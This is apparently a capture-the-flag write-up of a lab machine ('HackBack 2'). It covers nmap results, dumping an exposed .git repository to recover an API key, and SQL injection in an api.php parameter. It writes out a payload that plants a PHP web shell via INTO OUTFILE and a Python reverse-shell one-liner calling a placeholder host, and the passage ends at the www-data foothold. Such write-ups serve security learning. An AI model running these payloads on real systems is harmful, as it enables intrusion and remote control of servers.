# NMAP

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:11:d6:ab:cc:f2:71:c8:40:e2:1d:97:07:09:6b:eb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvGF7If+TAlknFH/FDMXkhsCJ42eZhvyt/mFDlFw/JyFIWnzTarhTH8MU1o7qrTUUJ3YnlQhu2kjOVlgkL+r48ibhfkzoEmNAIy54kxFLXaC7hFkOpYPehtfCBvxzehclToZq8nsaECbPgEFFOUiFIdQ3yo87CHR1aWeaYh9KdrdObyWUsPRKqNHwVTXXUNhwlLsoJZDJccbH56rdGOpRf3oP1qqWfCUnMDN55o8fkgW0tVLdRFxvuRmlOKdEdCEB6VEDsp2z/QFtuDDSCGPwo1XDqp5SLRGIc+LKhAQZHhnBShaXmnvwLShGLqaU0EAzIBQ96dvNkkTAvZAzazMcN
|   256 cd:d6:f0:67:0e:1b:b3:2c:99:9f:7b:bb:70:42:b5:a5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLaioJd8smxzz0s9lMNoVu95NxoazDCi+ZMZ+sdxtPCiGpesRMmBZjyav7T4REZyqPR6vrvKymnnRio09JGuE6E=
|   256 e1:70:d2:f4:c9:73:6c:f0:d8:1f:d4:d8:a0:9f:8c:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJsWZhy909do/TDDtLBrrwcU2A6mW99pJq4zV7IT2bG7
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.245.245:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: added mobile apk for beta testing. 
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Context Information Security - HackBack 2
```

# Enumeration

**SSH Version Username Enumeration Exploit**
![image](https://user-images.githubusercontent.com/68326057/124961295-e59e1680-e03a-11eb-80d9-2eac65e35eeb.png)

## *PORT 80*

![image](https://user-images.githubusercontent.com/68326057/124961586-4a597100-e03b-11eb-930c-b5428762face.png)

```bash
$file config ;cat config 

config: ASCII text
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Context Information Security
        email = recruitment@contextis.com
```


On /info.php

![image](https://user-images.githubusercontent.com/68326057/124961899-a45a3680-e03b-11eb-898b-fb0f29a6a092.png)

Linux version is `4.4.0-1095` , This is an older version of Linux which can be easily exploited.

## Enumerating GIT

https://github.com/bl4de/research/tree/master/hidden_directories_leaks#hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application

I found this --> http://10.10.245.245/.git/logs/HEAD

![image](https://user-images.githubusercontent.com/68326057/124979690-feb1c200-e050-11eb-8ff8-5ca87c892049.png)

```bash
$cat HEAD | cut -d ' ' -f 2

152b2d9976cd37a68fd462af8e4ce21356b5485e
93bab0a450caaa8c4d2632703636eccc69062bb4
79c9539b6566b06d6dec2755fdf58f5f9ec8822f
b2f776a52fe81a731c6c0fa896e7f9548aafceab
04f1f411857cc972ae8ed5efcffa298f5f6168fb
fee5595bb2ba1d1ab005ec3de98367fe5d021e9f
6db3cf70b469de942f2f529166088cdfbbd5f764
```

**NOTE:- The first two letter named as a directory**

So I downloaded all commits.

I used thi tool:-

https://github.com/lijiejie/GitHack

```bash
[+] Download and parse index file ...
CTX_WSUSpect_White_Paper.pdf
Context_Red_Teaming_Guide.pdf
Context_White_Paper_Pen_Test_101.pdf
Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
Glibc_Adventures-The_Forgotten_Chunks.pdf
api.php
functions.php
home.php
index.php
info.php
[OK] api.php
[OK] functions.php
[OK] home.php
[OK] index.php
[OK] info.php
[OK] Context_White_Paper_Pen_Test_101.pdf
[OK] CTX_WSUSpect_White_Paper.pdf
[OK] Glibc_Adventures-The_Forgotten_Chunks.pdf
[OK] Context_Red_Teaming_Guide.pdf
[OK] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
```

![image](https://user-images.githubusercontent.com/68326057/124985436-07f25d00-e058-11eb-8066-0f759942b781.png)


Now I have the key I visited that site

http://10.10.245.245/api.php?apikey=WEBLhvOJAH8d50Z4y5G5

![image](https://user-images.githubusercontent.com/68326057/124985991-b7c7ca80-e058-11eb-9afa-f2837f41fc00.png)


http://10.10.245.245/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1

![image](https://user-images.githubusercontent.com/68326057/124986042-cb733100-e058-11eb-8d1f-a2d131b24135.png)

![image](https://user-images.githubusercontent.com/68326057/124986098-dd54d400-e058-11eb-90b4-3b574c44e2af.png)

So it is using sql connection.

Since we know `documentid` is the only thing using sql I tested it

## SQL INJECTION

![image](https://user-images.githubusercontent.com/68326057/124986468-40df0180-e059-11eb-843d-becd7df275ef.png)

So it is using MYSQL


![image](https://user-images.githubusercontent.com/68326057/124988356-84d30600-e05b-11eb-8a18-590d2c7acb53.png)


API key is Using this function

![image](https://user-images.githubusercontent.com/68326057/124988668-e5fad980-e05b-11eb-923d-9a89a8e6f919.png)


![image](https://user-images.githubusercontent.com/68326057/124988746-0034b780-e05c-11eb-9be8-9817d575e151.png)

I made my payload by analysing the above code.

![image](https://user-images.githubusercontent.com/68326057/124997919-1d23b780-e069-11eb-9647-ec5cd647aefc.png)


```bash
http://10.10.20.199/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1 order by 3
```

but it will not shows the result.

![image](https://user-images.githubusercontent.com/68326057/124998564-46911300-e06a-11eb-8a9f-eecda4fb8baa.png)

But it is executing the code.

```bash
http://10.10.20.199/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1%20union%20all%20select%201,2,@@version into outfile '/var/www/html/whoami.html
```

what it does it execute the query and stores in ip/whoami.html

![image](https://user-images.githubusercontent.com/68326057/124999370-96240e80-e06b-11eb-9581-eb4f6aceac30.png)


YESSS!!

Now it is time for code Execution

```bash
http://10.10.20.199/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1 union all select 1,2,"<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/rev.php"
```

![image](https://user-images.githubusercontent.com/68326057/124999761-7c36fb80-e06c-11eb-8711-658527dc84d4.png)

!! BOOM!!


```bash
http://10.10.20.199/rev.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22IP%22,9001));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

```

![image](https://user-images.githubusercontent.com/68326057/125000553-4a269900-e06e-11eb-8ba4-85f272beb7d5.png)


# USER WWW-DATA

First Thing I did is I connected with mysql
![image](https://user-images.githubusercontent.com/68326057/125000735-aee1f380-e06e-11eb-8db1-1552e169e2ba.png)


![image](https://user-images.githubusercontent.com/68326057/125000899-0bdda980-e06f-11eb-8a31-804a4693bc50.png)


![image](https://user-images.githubusercontent.com/68326057/125000986-40e9fc00-e06f-11eb-9c6f-ce8f93696752.png)


